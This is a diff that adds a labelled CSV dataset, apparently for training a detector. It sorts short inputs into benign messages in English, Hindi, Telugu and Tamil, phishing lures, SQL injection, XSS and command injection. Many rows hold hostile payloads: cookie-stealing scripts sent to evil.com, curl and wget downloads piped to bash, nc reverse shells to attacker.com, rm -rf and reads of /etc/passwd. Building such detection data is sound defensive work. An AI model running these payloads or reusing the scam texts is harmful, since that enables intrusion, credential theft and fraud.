@@ -1,0 +1,389 @@
+text,label
+Your parcel could not be delivered. Pay a small fee to reschedule: http://urgent-verify-now.co,PHISHING
+"आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://urgent-verify-now.co",PHISHING
+"Can you help me schedule a meeting for next Tuesday at 3 PM? உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி.",BENIGN
+"1'/**/UNION/**/SELECT/**/NULL,NULL,NULL--",SQL_INJECTION
+<SCRIPT>ALERT('XSS')</SCRIPT>,XSS
+"बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://account-alert-service.xyz",PHISHING
+You have been selected for a cashback offer. Enter your UPI PIN to claim: http://parcel-track-pay.com,PHISHING
+నేను రేపు ఆఫీసుకు 10 గంటలకు వస్తాను. The invoice for last month has been generated and sent to accounting.,BENIGN
+"आपका ओटीपी समाप्त हो गया है, कृपया कार्ड विवरण फिर से दर्ज करें: http://parcel-track-pay.com",PHISHING
+Your bank account has been suspended. Click here immediately to verify: http://fraud-verify.com,PHISHING
+Your OTP has expired. Re-enter your card details to continue: http://parcel-track-pay.com,PHISHING
+"बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://urgent-verify-now.co",PHISHING
+Final notice: pay your pending electricity bill within 2 hours: http://prize-claim24.com,PHISHING
+select * from users where id = %271%27 or %271%27=%271%27,SQL_INJECTION
+"Congratulations! You have won a lottery of $10,000. Claim now at http://secure-bank-update.net",PHISHING
+You have been selected for a cashback offer. Enter your UPI PIN to claim: http://fraud-verify.com,PHISHING
+"""><script>document.location='http://evil.com'</script>",XSS
+"Congratulations! You have won a lottery of $10,000. Claim now at http://account-alert-service.xyz",PHISHING
+127.0.0.1;/**/ls/**/-la,COMMAND_INJECTION
+' or 1=1#,SQL_INJECTION
+"बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://secure-bank-update.net",PHISHING
+मुझे अपने खाते की जानकारी अपडेट करनी है।,BENIGN
+"; python3 -c 'import os;os.system(""id"")'",COMMAND_INJECTION
+Your bank account has been suspended. Click here immediately to verify: http://parcel-track-pay.com,PHISHING
+Final notice: pay your pending electricity bill within 2 hours: http://urgent-verify-now.co,PHISHING
+మీ బ్యాంక్ ఖాతా రద్దు చేయబడింది. వెంటనే ఇక్కడ క్లిక్ చేసి పాస్‌వర్డ్ మార్చండి: http://fraud-verify.com,PHISHING
+<IMG SRC=X ONERROR=THIS.SRC='HTTP://EVIL.COM/STEAL?C='+DOCUMENT.COOKIE>,XSS
+1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0,SQL_INJECTION
+"మీ పార్శిల్ డెలివరీ కాలేదు, చిన్న రుసుము చెల్లించి మళ్ళీ షెడ్యూల్ చేయండి: http://prize-claim24.com",PHISHING
+Final notice: pay your pending electricity bill within 2 hours: http://kyc-refresh.info,PHISHING
+<div onmouseover=alert('xss')>hover</div>,XSS
+<a/**/href=javascript:alert(1)>click</a>,XSS
+आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://secure-bank-update.net,PHISHING
+test.txt && rm -rf /var/www,COMMAND_INJECTION
+`WHOAMI`,COMMAND_INJECTION
+I would like to update my shipping address for future orders. நாளை கூட்டத்தின் நேரத்தை தெரிவிக்கவும்.,BENIGN
+; chmod 777 /etc/shadow,COMMAND_INJECTION
+உங்கள் வங்கிக் கணக்கு முடக்கப்பட்டுள்ளது. உடனடியாக இங்கே கிளிக் செய்து சரிபார்க்கவும்: http://prize-claim24.com,PHISHING
+<IMG SRC=X ONERROR=ALERT(1)>,XSS
+"உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி.",BENIGN
+"Thank you for your purchase, your order will arrive in 3 days. The invoice for last month has been generated and sent to accounting.",BENIGN
+Your OTP has expired. Re-enter your card details to continue: http://urgent-verify-now.co,PHISHING
+"बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://parcel-track-pay.com",PHISHING
+Security alert: unusual login detected. Verify your identity here: http://kyc-refresh.info,PHISHING
+|| curl -s http://evil.com/backdoor.sh | bash,COMMAND_INJECTION
+Final notice: pay your pending electricity bill within 2 hours: http://parcel-track-pay.com,PHISHING
+select * from users where id = '1' or '1'='1',SQL_INJECTION
+"మీ OTP గడువు ముగిసింది, కార్డు వివరాలు మళ్ళీ నమోదు చేయండి: http://parcel-track-pay.com",PHISHING
+javascript:alert(%27hacked%27),XSS
+"మీ OTP గడువు ముగిసింది, కార్డు వివరాలు మళ్ళీ నమోదు చేయండి: http://account-alert-service.xyz",PHISHING
+<INPUT ONFOCUS=ALERT(1) AUTOFOCUS>,XSS
+"आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://secure-bank-update.net",PHISHING
+"Dear customer, your KYC is pending. Complete it now or your account will be blocked: http://kyc-refresh.info",PHISHING
+<body onload=alert('xss')>,XSS
+URGENT: Your account will be locked in 24 hours. Update your password now: http://fraud-verify.com,PHISHING
+"வாழ்த்துக்கள்! நீங்கள் 50,000 ரூபாய் பரிசு வென்றுள்ளீர்கள். இப்போது கோரவும்: http://secure-bank-update.net",PHISHING
+; /BIN/BASH -C 'REVERSE_SHELL',COMMAND_INJECTION
+"The new product update includes several performance improvements. మీ ఆర్డర్ విజయవంతంగా డెలివరీ చేయబడింది, ధన్యవాదాలు.",BENIGN
+எனது கடவுச்சொல்லை மாற்ற உதவுங்கள். My flight got delayed by two hours due to weather.,BENIGN
+Please find attached the quarterly sales report for review. The invoice for last month has been generated and sent to accounting.,BENIGN
+Please find attached the quarterly sales report for review. कृपया मुझे कल की बैठक का समय बताएं।,BENIGN
+Your OTP has expired. Re-enter your card details to continue: http://fraud-verify.com,PHISHING
+"మీ KYC పెండింగ్‌లో ఉంది, వెంటనే అప్‌డేట్ చేయకపోతే ఖాతా బ్లాక్ అవుతుంది: http://kyc-refresh.info",PHISHING
+1; DROP TABLE users;--,SQL_INJECTION
+"आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://account-alert-service.xyz",PHISHING
+admin'/**/OR/**/'1'='1'#,SQL_INJECTION
+1; DROP TABLE USERS;--,SQL_INJECTION
+; ECHO HACKED > /VAR/WWW/HTML/SHELL.PHP,COMMAND_INJECTION
+1;/**/DROP/**/TABLE/**/users;--,SQL_INJECTION
+URGENT: Your account will be locked in 24 hours. Update your password now: http://kyc-refresh.info,PHISHING
+' union select credit_card from payments--,SQL_INJECTION
+Security alert: unusual login detected. Verify your identity here: http://prize-claim24.com,PHISHING
+"1' union select null,null,null--",SQL_INJECTION
+"வாழ்த்துக்கள்! நீங்கள் 50,000 ரூபாய் பரிசு வென்றுள்ளீர்கள். இப்போது கோரவும்: http://urgent-verify-now.co",PHISHING
+"बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://prize-claim24.com",PHISHING
+%27; INSERT INTO logs VALUES(%27x%27)--,SQL_INJECTION
+SELECT * FROM USERS WHERE ID = '1' OR '1'='1',SQL_INJECTION
+&& powershell -enc SGVsbG8=,COMMAND_INJECTION
+";/**/python3/**/-c/**/'import/**/os;os.system(""id"")'",COMMAND_INJECTION
+"Congratulations! You have won a lottery of $10,000. Claim now at http://prize-claim24.com",PHISHING
+'/**/OR/**/1=1#,SQL_INJECTION
+1%27 ORDER BY 10--,SQL_INJECTION
+"మీ OTP గడువు ముగిసింది, కార్డు వివరాలు మళ్ళీ నమోదు చేయండి: http://fraud-verify.com",PHISHING
+నా పాస్‌వర్డ్ మార్చుకోవడం ఎలా అని తెలుసుకోవాలనుకుంటున్నాను. எனது கடவுச்சொல்லை மாற்ற உதவுங்கள்.,BENIGN
+%27 OR %271%27=%271,SQL_INJECTION
+"మీ పార్శిల్ డెలివరీ కాలేదు, చిన్న రుసుము చెల్లించి మళ్ళీ షెడ్యూల్ చేయండి: http://kyc-refresh.info",PHISHING
+'; INSERT INTO LOGS VALUES('X')--,SQL_INJECTION
+You have been selected for a cashback offer. Enter your UPI PIN to claim: http://kyc-refresh.info,PHISHING
+"మీ పార్శిల్ డెలివరీ కాలేదు, చిన్న రుసుము చెల్లించి మళ్ళీ షెడ్యూల్ చేయండి: http://parcel-track-pay.com",PHISHING
+1 and (select count(*) from information_schema.tables)>0,SQL_INJECTION
+నేను రేపు ఆఫీసుకు 10 గంటలకు వస్తాను. कृपया मुझे कल की बैठक का समय बताएं।,BENIGN
+| nc attacker.com 4444 -e /bin/bash,COMMAND_INJECTION
+<BODY ONLOAD=ALERT('XSS')>,XSS
+"Dear customer, your KYC is pending. Complete it now or your account will be blocked: http://prize-claim24.com",PHISHING
+Your parcel could not be delivered. Pay a small fee to reschedule: http://secure-bank-update.net,PHISHING
+| NC ATTACKER.COM 4444 -E /BIN/BASH,COMMAND_INJECTION
+"உங்கள் KYC நிலுவையில் உள்ளது, உடனடியாக புதுப்பிக்கவும்: http://prize-claim24.com",PHISHING
+"; PYTHON3 -C 'IMPORT OS;OS.SYSTEM(""ID"")'",COMMAND_INJECTION
+"మీ OTP గడువు ముగిసింది, కార్డు వివరాలు మళ్ళీ నమోదు చేయండి: http://urgent-verify-now.co",PHISHING
+""" OR """"=""",SQL_INJECTION
+"உங்கள் KYC நிலுவையில் உள்ளது, உடனடியாக புதுப்பிக்கவும்: http://kyc-refresh.info",PHISHING
+"Congratulations! You have won a lottery of $10,000. Claim now at http://fraud-verify.com",PHISHING
+$(CURL HTTP://EVIL.COM/SHELL.SH | BASH),COMMAND_INJECTION
+select/**/*/**/from/**/users/**/where/**/id/**/=/**/'1'/**/or/**/'1'='1',SQL_INJECTION
+%27 UNION SELECT credit_card FROM payments--,SQL_INJECTION
+"आपका ओटीपी समाप्त हो गया है, कृपया कार्ड विवरण फिर से दर्ज करें: http://secure-bank-update.net",PHISHING
+Your subscription payment failed. Update billing info immediately: http://prize-claim24.com,PHISHING
+ADMIN' OR '1'='1'#,SQL_INJECTION
+$(curl/**/http://evil.com/shell.sh/**/|/**/bash),COMMAND_INJECTION
+"మీ పార్శిల్ డెలివరీ కాలేదు, చిన్న రుసుము చెల్లించి మళ్ళీ షెడ్యూల్ చేయండి: http://urgent-verify-now.co",PHISHING
+; echo hacked > /var/www/html/shell.php,COMMAND_INJECTION
+Your bank account has been suspended. Click here immediately to verify: http://urgent-verify-now.co,PHISHING
+Can you help me schedule a meeting for next Tuesday at 3 PM? I would like to update my shipping address for future orders.,BENIGN
+Your bank account has been suspended. Click here immediately to verify: http://prize-claim24.com,PHISHING
+Please find attached the quarterly sales report for review.,BENIGN
+"మీ OTP గడువు ముగిసింది, కార్డు వివరాలు మళ్ళీ నమోదు చేయండి: http://secure-bank-update.net",PHISHING
+;/**/echo/**/hacked/**/>/**//var/www/html/shell.php,COMMAND_INJECTION
+admin' OR '1'='1'#,SQL_INJECTION
+எனது கடவுச்சொல்லை மாற்ற உதவுங்கள்.,BENIGN
+The new product update includes several performance improvements.,BENIGN
+आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://prize-claim24.com,PHISHING
+உங்கள் வங்கிக் கணக்கு முடக்கப்பட்டுள்ளது. உடனடியாக இங்கே கிளிக் செய்து சரிபார்க்கவும்: http://fraud-verify.com,PHISHING
+' OR 1=1#,SQL_INJECTION
+నేను రేపు ఆఫీసుకు 10 గంటలకు వస్తాను.,BENIGN
+Please review the attached contract and share your feedback by Friday. Let's catch up over coffee sometime next week.,BENIGN
+"మీ పార్శిల్ డెలివరీ కాలేదు, చిన్న రుసుము చెల్లించి మళ్ళీ షెడ్యూల్ చేయండి: http://fraud-verify.com",PHISHING
+&& powershell -enc sgvsbg8=,COMMAND_INJECTION
+"Can you help me schedule a meeting for next Tuesday at 3 PM? select name, email from customers where active = true",BENIGN
+<a href=javascript:alert(1)>click</a>,XSS
+நாளை கூட்டத்தின் நேரத்தை தெரிவிக்கவும். எனது கடவுச்சொல்லை மாற்ற உதவுங்கள்.,BENIGN
+admin' or '1'='1'#,SQL_INJECTION
+మీ బ్యాంక్ ఖాతా రద్దు చేయబడింది. వెంటనే ఇక్కడ క్లిక్ చేసి పాస్‌వర్డ్ మార్చండి: http://secure-bank-update.net,PHISHING
+<script>fetch(%27http://evil.com/%27+document.cookie)</script>,XSS
+कृपया मुझे कल की बैठक का समय बताएं।,BENIGN
+"మీ KYC పెండింగ్‌లో ఉంది, వెంటనే అప్‌డేట్ చేయకపోతే ఖాతా బ్లాక్ అవుతుంది: http://parcel-track-pay.com",PHISHING
+&& cat /etc/passwd,COMMAND_INJECTION
+உங்கள் வங்கிக் கணக்கு முடக்கப்பட்டுள்ளது. உடனடியாக இங்கே கிளிக் செய்து சரிபார்க்கவும்: http://parcel-track-pay.com,PHISHING
+"మీ ఆర్డర్ విజయవంతంగా డెలివరీ చేయబడింది, ధన్యవాదాలు. आपका ऑर्डर सफलतापूर्वक डिलीवर हो गया है, धन्यवाद।",BENIGN
+URGENT: Your account will be locked in 24 hours. Update your password now: http://secure-bank-update.net,PHISHING
+' and sleep(5)--,SQL_INJECTION
+<DIV ONMOUSEOVER=ALERT('XSS')>HOVER</DIV>,XSS
+Your subscription payment failed. Update billing info immediately: http://parcel-track-pay.com,PHISHING
+1 AND (SELECT COUNT(*) FROM information_schema.tables)>0,SQL_INJECTION
+The new product update includes several performance improvements. నేను రేపు ఆఫీసుకు 10 గంటలకు వస్తాను.,BENIGN
+admin'--,SQL_INJECTION
+Your subscription payment failed. Update billing info immediately: http://secure-bank-update.net,PHISHING
+You have been selected for a cashback offer. Enter your UPI PIN to claim: http://prize-claim24.com,PHISHING
+The invoice for last month has been generated and sent to accounting. My flight got delayed by two hours due to weather.,BENIGN
+%27 OR %27a%27=%27a,SQL_INJECTION
+Your bank account has been suspended. Click here immediately to verify: http://secure-bank-update.net,PHISHING
+"<SVG/ONLOAD=ALERT(STRING.FROMCHARCODE(88,83,83))>",XSS
+"வாழ்த்துக்கள்! நீங்கள் 50,000 ரூபாய் பரிசு வென்றுள்ளீர்கள். இப்போது கோரவும்: http://prize-claim24.com",PHISHING
+' AND SLEEP(5)--,SQL_INJECTION
+"What is the weather forecast for tomorrow in Hyderabad? आपका ऑर्डर सफलतापूर्वक डिलीवर हो गया है, धन्यवाद।",BENIGN
+"आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://kyc-refresh.info",PHISHING
+"आपका ओटीपी समाप्त हो गया है, कृपया कार्ड विवरण फिर से दर्ज करें: http://account-alert-service.xyz",PHISHING
+<svg/**/onload=alert(document.cookie)>,XSS
+Final notice: pay your pending electricity bill within 2 hours: http://fraud-verify.com,PHISHING
+உங்கள் வங்கிக் கணக்கு முடக்கப்பட்டுள்ளது. உடனடியாக இங்கே கிளிக் செய்து சரிபார்க்கவும்: http://account-alert-service.xyz,PHISHING
+"""/**/OR/**/""""=""",SQL_INJECTION
+"Congratulations! You have won a lottery of $10,000. Claim now at http://urgent-verify-now.co",PHISHING
+' or '1'='1,SQL_INJECTION
+<input/**/onfocus=alert(1)/**/autofocus>,XSS
+आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://fraud-verify.com,PHISHING
+%27-alert(1)-%27,XSS
+URGENT: Your account will be locked in 24 hours. Update your password now: http://prize-claim24.com,PHISHING
+127.0.0.1; LS -LA,COMMAND_INJECTION
+"Dear customer, your KYC is pending. Complete it now or your account will be blocked: http://fraud-verify.com",PHISHING
+$(NC -E /BIN/SH ATTACKER.COM 1234),COMMAND_INJECTION
+"நாளை கூட்டத்தின் நேரத்தை தெரிவிக்கவும். I really enjoyed the movie we watched last weekend, the plot was great.",BENIGN
+Let's catch up over coffee sometime next week.,BENIGN
+My flight got delayed by two hours due to weather.,BENIGN
+మీ బ్యాంక్ ఖాతా రద్దు చేయబడింది. వెంటనే ఇక్కడ క్లిక్ చేసి పాస్‌వర్డ్ మార్చండి: http://urgent-verify-now.co,PHISHING
+"வாழ்த்துக்கள்! நீங்கள் 50,000 ரூபாய் பரிசு வென்றுள்ளீர்கள். இப்போது கோரவும்: http://kyc-refresh.info",PHISHING
+"మీ ఆర్డర్ విజయవంతంగా డెలివరీ చేయబడింది, ధన్యవాదాలు.",BENIGN
+"1%27 UNION SELECT NULL,NULL,NULL--",SQL_INJECTION
+""" or """"=""",SQL_INJECTION
+మీకు లక్కీ డ్రా లో 50000 రూపాయలు వచ్చాయి. ఇప్పుడే క్లెయిమ్ చేయండి: http://prize-claim24.com,PHISHING
+Our team completed the sprint review and updated the backlog. The server maintenance window is scheduled for Sunday 2 AM to 4 AM.,BENIGN
+%27 OR 1=1--,SQL_INJECTION
+1' order by 10--,SQL_INJECTION
+Can you help me schedule a meeting for next Tuesday at 3 PM?,BENIGN
+"' UNION SELECT USERNAME, PASSWORD FROM USERS--",SQL_INJECTION
+'-alert(1)-',XSS
+127.0.0.1; ls -la,COMMAND_INJECTION
+"మీ పార్శిల్ డెలివరీ కాలేదు, చిన్న రుసుము చెల్లించి మళ్ళీ షెడ్యూల్ చేయండి: http://secure-bank-update.net",PHISHING
+Our team completed the sprint review and updated the backlog.,BENIGN
+"आपका ओटीपी समाप्त हो गया है, कृपया कार्ड विवरण फिर से दर्ज करें: http://kyc-refresh.info",PHISHING
+"<svg/onload=alert(String.fromCharCode(88,83,83))>",XSS
+The library is open until 8 PM on weekdays. My flight got delayed by two hours due to weather.,BENIGN
+' OR 'A'='A,SQL_INJECTION
+"आपका ओटीपी समाप्त हो गया है, कृपया कार्ड विवरण फिर से दर्ज करें: http://urgent-verify-now.co",PHISHING
+URGENT: Your account will be locked in 24 hours. Update your password now: http://parcel-track-pay.com,PHISHING
+admin%27--,SQL_INJECTION
+%27 AND SLEEP(5)--,SQL_INJECTION
+test.txt/**/&&/**/rm/**/-rf/**//var/www,COMMAND_INJECTION
+You have been selected for a cashback offer. Enter your UPI PIN to claim: http://account-alert-service.xyz,PHISHING
+Security alert: unusual login detected. Verify your identity here: http://urgent-verify-now.co,PHISHING
+Can you help me schedule a meeting for next Tuesday at 3 PM? कृपया मुझे कल की बैठक का समय बताएं।,BENIGN
+'; EXEC xp_cmdshell('dir')--,SQL_INJECTION
+"select name, email from customers where active = true",BENIGN
+Your subscription payment failed. Update billing info immediately: http://account-alert-service.xyz,PHISHING
+'/**/OR/**/'a'='a,SQL_INJECTION
+Security alert: unusual login detected. Verify your identity here: http://parcel-track-pay.com,PHISHING
+;/**/chmod/**/777/**//etc/shadow,COMMAND_INJECTION
+'/**/OR/**/'1'='1,SQL_INJECTION
+' UNION SELECT CREDIT_CARD FROM PAYMENTS--,SQL_INJECTION
+"""><SCRIPT>DOCUMENT.LOCATION='HTTP://EVIL.COM'</SCRIPT>",XSS
+&&/**/cat/**//etc/passwd,COMMAND_INJECTION
+"Our team completed the sprint review and updated the backlog. I really enjoyed the movie we watched last weekend, the plot was great.",BENIGN
+"बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://kyc-refresh.info",PHISHING
+<SVG ONLOAD=ALERT(DOCUMENT.COOKIE)>,XSS
+<img src=x onerror=this.src=%27http://evil.com/steal?c=%27+document.cookie>,XSS
+आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://urgent-verify-now.co,PHISHING
+"Dear customer, your KYC is pending. Complete it now or your account will be blocked: http://account-alert-service.xyz",PHISHING
+<iframe src=javascript:alert(1)>,XSS
+"'/**/UNION/**/SELECT/**/username,/**/password/**/FROM/**/users--",SQL_INJECTION
+' OR 'a'='a,SQL_INJECTION
+"select name, email from customers where active = true Please review the attached contract and share your feedback by Friday.",BENIGN
+Please review the attached contract and share your feedback by Friday.,BENIGN
+'/**/UNION/**/SELECT/**/credit_card/**/FROM/**/payments--,SQL_INJECTION
+;/**/rm/**/-rf/**//,COMMAND_INJECTION
+<body/**/onload=alert('xss')>,XSS
+"உங்கள் KYC நிலுவையில் உள்ளது, உடனடியாக புதுப்பிக்கவும்: http://parcel-track-pay.com",PHISHING
+మీకు లక్కీ డ్రా లో 50000 రూపాయలు వచ్చాయి. ఇప్పుడే క్లెయిమ్ చేయండి: http://account-alert-service.xyz,PHISHING
+1' ORDER BY 10--,SQL_INJECTION
+"%27 UNION SELECT username, password FROM users--",SQL_INJECTION
+"வாழ்த்துக்கள்! நீங்கள் 50,000 ரூபாய் பரிசு வென்றுள்ளீர்கள். இப்போது கோரவும்: http://account-alert-service.xyz",PHISHING
+"Please find attached the quarterly sales report for review. உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி.",BENIGN
+"बधाई हो! आपने 50,000 रुपये का इनाम जीता है। अभी दावा करें: http://fraud-verify.com",PHISHING
+మీ బ్యాంక్ ఖాతా రద్దు చేయబడింది. వెంటనే ఇక్కడ క్లిక్ చేసి పాస్‌వర్డ్ మార్చండి: http://parcel-track-pay.com,PHISHING
+';/**/INSERT/**/INTO/**/logs/**/VALUES('x')--,SQL_INJECTION
+; wget http://evil.com/malware.sh -o- | sh,COMMAND_INJECTION
+The invoice for last month has been generated and sent to accounting.,BENIGN
+' or 1=1--,SQL_INJECTION
+మీ బ్యాంక్ ఖాతా రద్దు చేయబడింది. వెంటనే ఇక్కడ క్లిక్ చేసి పాస్‌వర్డ్ మార్చండి: http://account-alert-service.xyz,PHISHING
+Security alert: unusual login detected. Verify your identity here: http://secure-bank-update.net,PHISHING
+ADMIN'--,SQL_INJECTION
+TEST.TXT && RM -RF /VAR/WWW,COMMAND_INJECTION
+"உங்கள் KYC நிலுவையில் உள்ளது, உடனடியாக புதுப்பிக்கவும்: http://urgent-verify-now.co",PHISHING
+"आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://fraud-verify.com",PHISHING
+"வாழ்த்துக்கள்! நீங்கள் 50,000 ரூபாய் பரிசு வென்றுள்ளீர்கள். இப்போது கோரவும்: http://fraud-verify.com",PHISHING
+உங்கள் வங்கிக் கணக்கு முடக்கப்பட்டுள்ளது. உடனடியாக இங்கே கிளிக் செய்து சரிபார்க்கவும்: http://secure-bank-update.net,PHISHING
+"உங்கள் KYC நிலுவையில் உள்ளது, உடனடியாக புதுப்பிக்கவும்: http://fraud-verify.com",PHISHING
+<img src=x onerror=alert(1)>,XSS
+"I really enjoyed the movie we watched last weekend, the plot was great.",BENIGN
+"మీ OTP గడువు ముగిసింది, కార్డు వివరాలు మళ్ళీ నమోదు చేయండి: http://kyc-refresh.info",PHISHING
+; /bin/bash -c 'reverse_shell',COMMAND_INJECTION
+$(nc -e /bin/sh attacker.com 1234),COMMAND_INJECTION
+"Dear customer, your KYC is pending. Complete it now or your account will be blocked: http://parcel-track-pay.com",PHISHING
+"మీ KYC పెండింగ్‌లో ఉంది, వెంటనే అప్‌డేట్ చేయకపోతే ఖాతా బ్లాక్ అవుతుంది: http://urgent-verify-now.co",PHISHING
+உங்கள் வங்கிக் கணக்கு முடக்கப்பட்டுள்ளது. உடனடியாக இங்கே கிளிக் செய்து சரிபார்க்கவும்: http://urgent-verify-now.co,PHISHING
+'/**/AND/**/SLEEP(5)--,SQL_INJECTION
+"' union select username, password from users--",SQL_INJECTION
+'-ALERT(1)-',XSS
+||/**/curl/**/-s/**/http://evil.com/backdoor.sh/**/|/**/bash,COMMAND_INJECTION
+' WAITFOR DELAY '0:0:5'--,SQL_INJECTION
+"உங்கள் KYC நிலுவையில் உள்ளது, உடனடியாக புதுப்பிக்கவும்: http://secure-bank-update.net",PHISHING
+'; insert into logs values('x')--,SQL_INJECTION
+నా పాస్‌వర్డ్ మార్చుకోవడం ఎలా అని తెలుసుకోవాలనుకుంటున్నాను.,BENIGN
+<img/**/src=x/**/onerror=alert(1)>,XSS
+"आपका ओटीपी समाप्त हो गया है, कृपया कार्ड विवरण फिर से दर्ज करें: http://fraud-verify.com",PHISHING
+' waitfor delay '0:0:5'--,SQL_INJECTION
+మీ బ్యాంక్ ఖాతా రద్దు చేయబడింది. వెంటనే ఇక్కడ క్లిక్ చేసి పాస్‌వర్డ్ మార్చండి: http://kyc-refresh.info,PHISHING
+; WGET HTTP://EVIL.COM/MALWARE.SH -O- | SH,COMMAND_INJECTION
+"' UNION SELECT username, password FROM users--",SQL_INJECTION
+"మీ KYC పెండింగ్‌లో ఉంది, వెంటనే అప్‌డేట్ చేయకపోతే ఖాతా బ్లాక్ అవుతుంది: http://secure-bank-update.net",PHISHING
+"""><script>document.location=%27http://evil.com%27</script>",XSS
+"మీ పార్శిల్ డెలివరీ కాలేదు, చిన్న రుసుము చెల్లించి మళ్ళీ షెడ్యూల్ చేయండి: http://account-alert-service.xyz",PHISHING
+మీకు లక్కీ డ్రా లో 50000 రూపాయలు వచ్చాయి. ఇప్పుడే క్లెయిమ్ చేయండి: http://fraud-verify.com,PHISHING
+నేను రేపు ఆఫీసుకు 10 గంటలకు వస్తాను. Let's catch up over coffee sometime next week.,BENIGN
+1/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables)>0,SQL_INJECTION
+మీ బ్యాంక్ ఖాతా రద్దు చేయబడింది. వెంటనే ఇక్కడ క్లిక్ చేసి పాస్‌వర్డ్ మార్చండి: http://prize-claim24.com,PHISHING
+'/**/OR/**/1=1--,SQL_INJECTION
+How do I reset my password from the account settings page? Our team completed the sprint review and updated the backlog.,BENIGN
+<body onload=alert(%27xss%27)>,XSS
+உங்கள் வங்கிக் கணக்கு முடக்கப்பட்டுள்ளது. உடனடியாக இங்கே கிளிக் செய்து சரிபார்க்கவும்: http://kyc-refresh.info,PHISHING
+Security alert: unusual login detected. Verify your identity here: http://fraud-verify.com,PHISHING
+; /bin/bash -c %27reverse_shell%27,COMMAND_INJECTION
+; RM -RF /,COMMAND_INJECTION
+நாளை கூட்டத்தின் நேரத்தை தெரிவிக்கவும். Our team completed the sprint review and updated the backlog.,BENIGN
+మీకు లక్కీ డ్రా లో 50000 రూపాయలు వచ్చాయి. ఇప్పుడే క్లెయిమ్ చేయండి: http://kyc-refresh.info,PHISHING
+"Thank you for your purchase, your order will arrive in 3 days. I really enjoyed the movie we watched last weekend, the plot was great.",BENIGN
+Your OTP has expired. Re-enter your card details to continue: http://secure-bank-update.net,PHISHING
+<img/**/src=x/**/onerror=this.src='http://evil.com/steal?c='+document.cookie>,XSS
+Security alert: unusual login detected. Verify your identity here: http://account-alert-service.xyz,PHISHING
+"Thank you for your purchase, your order will arrive in 3 days.",BENIGN
+"Please review the attached contract and share your feedback by Friday. I really enjoyed the movie we watched last weekend, the plot was great.",BENIGN
+1'/**/ORDER/**/BY/**/10--,SQL_INJECTION
+எனது கடவுச்சொல்லை மாற்ற உதவுங்கள். Our team completed the sprint review and updated the backlog.,BENIGN
+"Please find attached the quarterly sales report for review. మీ ఆర్డర్ విజయవంతంగా డెలివరీ చేయబడింది, ధన్యవాదాలు.",BENIGN
+మీకు లక్కీ డ్రా లో 50000 రూపాయలు వచ్చాయి. ఇప్పుడే క్లెయిమ్ చేయండి: http://secure-bank-update.net,PHISHING
+'/**/waitfor/**/delay/**/'0:0:5'--,SQL_INJECTION
+"आपका ऑर्डर सफलतापूर्वक डिलीवर हो गया है, धन्यवाद। select name, email from customers where active = true",BENIGN
+URGENT: Your account will be locked in 24 hours. Update your password now: http://urgent-verify-now.co,PHISHING
+<A HREF=JAVASCRIPT:ALERT(1)>CLICK</A>,XSS
+Final notice: pay your pending electricity bill within 2 hours: http://secure-bank-update.net,PHISHING
+"कृपया मुझे कल की बैठक का समय बताएं। आपका ऑर्डर सफलतापूर्वक डिलीवर हो गया है, धन्यवाद।",BENIGN
+Your parcel could not be delivered. Pay a small fee to reschedule: http://account-alert-service.xyz,PHISHING
+<img src=x onerror=this.src='http://evil.com/steal?c='+document.cookie>,XSS
+<input onfocus=alert(1) autofocus>,XSS
+"Congratulations! You have won a lottery of $10,000. Claim now at http://kyc-refresh.info",PHISHING
+<script>fetch('http://evil.com/'+document.cookie)</script>,XSS
+<IFRAME SRC=JAVASCRIPT:ALERT(1)>,XSS
+I would like to update my shipping address for future orders.,BENIGN
+"Dear customer, your KYC is pending. Complete it now or your account will be blocked: http://secure-bank-update.net",PHISHING
+<svg onload=alert(document.cookie)>,XSS
+You have been selected for a cashback offer. Enter your UPI PIN to claim: http://urgent-verify-now.co,PHISHING
+; CHMOD 777 /ETC/SHADOW,COMMAND_INJECTION
+$(curl http://evil.com/shell.sh | bash),COMMAND_INJECTION
+"Dear customer, your KYC is pending. Complete it now or your account will be blocked: http://urgent-verify-now.co",PHISHING
+Your OTP has expired. Re-enter your card details to continue: http://kyc-refresh.info,PHISHING
+మీకు లక్కీ డ్రా లో 50000 రూపాయలు వచ్చాయి. ఇప్పుడే క్లెయిమ్ చేయండి: http://urgent-verify-now.co,PHISHING
+URGENT: Your account will be locked in 24 hours. Update your password now: http://account-alert-service.xyz,PHISHING
+' or 'a'='a,SQL_INJECTION
+"आपका ओटीपी समाप्त हो गया है, कृपया कार्ड विवरण फिर से दर्ज करें: http://prize-claim24.com",PHISHING
+"आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://prize-claim24.com",PHISHING
+1; drop table users;--,SQL_INJECTION
+' OR 1=1--,SQL_INJECTION
+&&/**/powershell/**/-enc/**/SGVsbG8=,COMMAND_INJECTION
+<SCRIPT>FETCH('HTTP://EVIL.COM/'+DOCUMENT.COOKIE)</SCRIPT>,XSS
+Your OTP has expired. Re-enter your card details to continue: http://prize-claim24.com,PHISHING
